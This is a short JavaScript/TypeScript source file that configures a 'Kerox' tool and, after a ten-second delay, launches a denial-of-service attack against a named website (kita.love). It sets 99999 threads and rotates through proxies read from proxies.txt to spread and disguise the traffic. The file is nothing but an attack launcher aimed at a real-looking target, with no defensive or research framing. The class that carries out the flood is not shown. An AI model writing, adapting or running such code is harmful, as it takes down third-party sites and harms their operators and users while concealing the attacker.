import express from 'express';
import { Kerox } from './partials/classes/Kerox';

const kerox = new Kerox({
   refreshRate: 5,
   useProxies: true, // use proxies from proxies.txt
   validateProxies: true, // validate proxies from proxies.txt
   updatesPerSecond: 1,
});

setTimeout(() => {
   kerox.ddos({
      target: 'https://kita.love/',
      duration: 15,
      threads: 99999,
      CPUs: 2,
      // agent: {
      //    keepAlive: true,
      //    scheduling: 'fifo',
      // }
   });
}, 10000);
